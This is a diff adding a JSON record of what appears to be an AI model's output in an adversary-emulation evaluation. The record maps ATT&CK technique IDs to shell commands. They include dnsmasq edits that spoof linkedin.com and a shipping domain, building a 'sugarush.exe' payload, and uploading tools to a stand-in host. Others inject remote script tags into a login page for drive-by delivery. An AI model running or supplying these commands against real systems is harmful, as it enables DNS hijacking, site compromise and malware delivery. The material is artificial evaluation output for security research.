@@ -1,0 +1,98 @@
+{
+  "campaign_id": "C0010",
+  "model": "gpt-oss:20b",
+  "sample": 1,
+  "temperature": 0.0,
+  "realizations": [
+    {
+      "technique_id": "T1583.001",
+      "mechanism": "dnsmasq-config",
+      "command": "echo 'address=/linkedin.com/192.168.1.10' >> /etc/dnsmasq.conf && systemctl restart dnsmasq",
+      "target": "actor.primary",
+      "parameters": {
+        "domain": "linkedin.com",
+        "ip": "192.168.1.10"
+      }
+    },
+    {
+      "technique_id": "T1584.001",
+      "mechanism": "dnsmasq-config",
+      "command": "echo 'address=/shippingcompany.co.il/192.168.1.20' >> /etc/dnsmasq.conf && systemctl restart dnsmasq",
+      "target": "actor.primary",
+      "parameters": {
+        "domain": "shippingcompany.co.il",
+        "ip": "192.168.1.20"
+      }
+    },
+    {
+      "technique_id": "T1587.001",
+      "mechanism": "python-build-malware",
+      "command": "python3 build_sugarush.py -o /tmp/sugarush.exe",
+      "target": "actor.primary",
+      "parameters": {
+        "source_script": "build_sugarush.py",
+        "output_path": "/tmp/sugarush.exe"
+      }
+    },
+    {
+      "technique_id": "T1588.002",
+      "mechanism": "download-tool",
+      "command": "wget https://metasploit.com/download/metasploit.zip -O /tmp/metasploit.zip",
+      "target": "actor.primary",
+      "parameters": {
+        "url": "https://metasploit.com/download/metasploit.zip",
+        "dest_path": "/tmp/metasploit.zip"
+      }
+    },
+    {
+      "technique_id": "T1608.001",
+      "mechanism": "http-upload",
+      "command": "curl -F 'file=@/tmp/sugarush.exe' http://endpoint.public_service/upload",
+      "target": "endpoint.public_service",
+      "parameters": {
+        "file_path": "/tmp/sugarush.exe",
+        "upload_url": "http://endpoint.public_service/upload"
+      }
+    },
+    {
+      "technique_id": "T1608.002",
+      "mechanism": "http-upload",
+      "command": "curl -F 'file=@/tmp/metasploit.zip' http://endpoint.public_service/upload",
+      "target": "endpoint.public_service",
+      "parameters": {
+        "file_path": "/tmp/metasploit.zip",
+        "upload_url": "http://endpoint.public_service/upload"
+      }
+    },
+    {
+      "technique_id": "T1608.004",
+      "mechanism": "webpage-modify",
+      "command": "sed -i '/<body>/a <script src=\"http://endpoint.public_service/track.js\"></script>' /var/www/shipping/login.html",
+      "target": "web_asset.benign_landing",
+      "parameters": {
+        "page_path": "/var/www/shipping/login.html",
+        "injection": "<script src='http://endpoint.public_service/track.js'></script>"
+      }
+    },
+    {
+      "technique_id": "T1189",
+      "mechanism": "driveby-script",
+      "command": "echo '<script src=\"http://endpoint.public_service/sugarush.exe\"></script>' >> /var/www/shipping/login.html",
+      "target": "web_asset.benign_landing",
+      "parameters": {
+        "page_path": "/var/www/shipping/login.html",
+        "injection": "<script src='http://endpoint.public_service/sugarush.exe'></script>"
+      }
+    },
+    {
+      "technique_id": "T1105",
+      "mechanism": "wget-from-target",
+      "command": "wget http://endpoint.public_service/metasploit.zip -O /tmp/metasploit.zip",
+      "target": "target.primary",
+      "parameters": {
+        "download_url": "http://endpoint.public_service/metasploit.zip",
+        "dest_path": "/tmp/metasploit.zip"
+      }
+    }
+  ]
+}
